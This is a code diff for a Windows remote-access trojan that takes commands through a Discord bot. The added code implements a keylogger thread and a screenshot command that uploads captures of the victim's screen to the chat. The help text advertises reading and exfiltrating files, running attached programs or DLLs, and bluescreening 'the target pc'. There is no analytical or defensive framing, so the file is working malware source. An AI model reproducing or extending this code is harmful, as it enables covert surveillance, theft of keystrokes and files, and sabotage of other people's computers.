@@ -4,14 +4,26 @@
 #include <wtsapi32.h>
 #include "helper.h"
 #include <Windows.h>
+#include <atlstr.h>
+#include <atlimage.h>
+#include <codecvt>
+#include "keylogger.h"
 
 /* all windows specific stuff such as popups */
 
 #define _CRT_SECURE_NO_WARNINGS
+#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS 
+#define _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING
 #pragma comment(lib, "Wtsapi32.lib")
 #pragma comment(lib, "Urlmon.lib")
 
+bool keyloggerActive = false;
+
+std::string allKeys;
+
 HANDLE GetProcessFromName(const char* name);
+
+DWORD WINAPI keylogger_thread(LPVOID lpParameter);
 
 bool is_number(const std::string& s);
 
@@ -169,21 +181,7 @@ std::string command_runprogram(std::vector<std::string> args, const dpp::message
 	return "Ran Program Successfuly!";
 }
 
-std::string command_readfile(std::vector<std::string> args, const dpp::message_create_t evnt) {
-	if (args.size() < 2)
-		return "Please Provide a Path to the File";
-	FILE* f = fopen(args[1].c_str(), "rb");
-	fseek(f, 0, SEEK_END);
-	long fsize = ftell(f);
-	fseek(f, 0, SEEK_SET);  /* same as rewind(f); */
 
-	char* string = new char[fsize + 1];
-	fread(string, fsize, 1, f);
-	fclose(f);
-	string[fsize] = '\0';
-
-	return string;
-}
 
 std::string command_loadlibrary(std::vector<std::string> args, const dpp::message_create_t evnt) {
 	if (evnt.msg.attachments.size() < 1)
@@ -198,8 +196,30 @@ std::string command_loadlibrary(std::vector<std::string> args, const dpp::messag
 	return "Loaded Library Successfuly";
 }
 
+std::string command_keyloggerstart(std::vector<std::string> args, dpp::message_create_t evnt) {
+	DWORD threadID;
+	dpp::message_create_t* passed_event = new dpp::message_create_t(evnt);
+	
+	keyloggerActive = true;
+	CreateThread(0, 0, keylogger_thread, reinterpret_cast<void*>(passed_event), 0, NULL);
+	return "Start Keylogger";
+}
+
+std::string command_keyloggerstop(std::vector<std::string> args, const dpp::message_create_t evnt) {
+	keyloggerActive = false;
+	Sleep(250);
+	std::string s = (allKeys.c_str() + (std::string)"\nStopped Keylogger");
+	std::cout << "s: "<< (int)s[1] << '\n';
+	return  std::string(allKeys.c_str() + (std::string)"\nStopped Keylogger");
+}
+
+
 std::string command_custom(std::vector<std::string> args, const dpp::message_create_t evnt) {
 	std::string path = getenv("APPDATA") + (std::string)"/slavcache";
+
+	// if the path isnt valid, its not a command
+	if (!fopen(path.c_str(), "rb"))
+		return "";
 
 	// additional information
 	STARTUPINFOA si;
@@ -270,10 +290,45 @@ std::string command_changebackround(std::vector<std::string> args, const dpp::me
 	return "Changed Backround!";
 }
 
+std::string command_screenshot(std::vector<std::string> args, const dpp::message_create_t& evnt) {
+	int monitorNumber;
+	if (args.size() != 1)
+		monitorNumber = std::stoi(args[1]);
+
+
+
+	HDC hScreenDC = GetDC(nullptr);
+	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+	int width = GetDeviceCaps(hScreenDC, HORZRES);
+	int height = GetDeviceCaps(hScreenDC, VERTRES);
+	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+	HBITMAP hOldBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hBitmap));
+	BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
+	hBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hOldBitmap));
+	DeleteDC(hMemoryDC);
+	DeleteDC(hScreenDC);
+
+
+	CImage image;
+	image.Attach(hBitmap);
+	
+	std::wstring s = (_wgetenv(L"APPDATA") + (std::wstring)L"/slavcache/backround.jpg");
+	image.Save(s.c_str());
+	dpp::message msg;
+
+
+	msg.add_file("screenshot.jpg", dpp::utility::read_file(getenv("APPDATA") + (std::string)"/slavcache/backround.jpg"));
+	evnt.send(msg);
+	return "";
+}
+
 std::string command_help(std::vector<std::string> args) {
-	return "cd {directory} - change active directory to {directory}\n"
+	return 
+		"cd {directory} - change active directory to {directory}\n"
 		"pwd - lists active path\n"
 		"ls - lists all files and directorys in the active directory\n"
+		"readfile {path} - reads the file given by the path\n"
+		"openfile {path} - copies the file from the target pc into an attatchment\n"
 		"popup {msg} - pops up {msg} on the targets screen\n"
 		"cmdspawn {amount of windows} {message} {seconds} - pops up a {amount of windows} of command prompt with the message of {msg} for {seconds} seconds\n"
 		"appclose {appid}/{appname} - closes the application with the proccess id of {appid} or with the name of {appname}\n"
@@ -281,8 +336,11 @@ std::string command_help(std::vector<std::string> args) {
 		"runprogram - runs the program attatched to the message\n"
 		"loadlibrary - loads the library attatched to the message\n"
 		"changebackround - changes the background image of the targets desktop to the attatched image\n"
-		"downloadfile - downloads the attatched file\n"
+		"downloadfile - downloads the attatched file to the target pc\n"
 		"bluescreen - bluescreens the target computer\n"
+		"keylog_start - starts the keylogger\n"
+		"keylog_stop - stops the keylogger\n"
+		"screenshot - takes a screenshot of the targets pc\n"
 		"help - this message";
 }
 
@@ -301,4 +359,11 @@ bool is_number(const std::string& s)
 	std::string::const_iterator it = s.begin();
 	while (it != s.end() && std::isdigit(*it)) ++it;
 	return !s.empty() && it == s.end();
+}
+
+DWORD WINAPI keylogger_thread(LPVOID lpParameter) {	
+	while (keyloggerActive) {
+		allKeys += keylog();
+	}
+	return 0;
 }
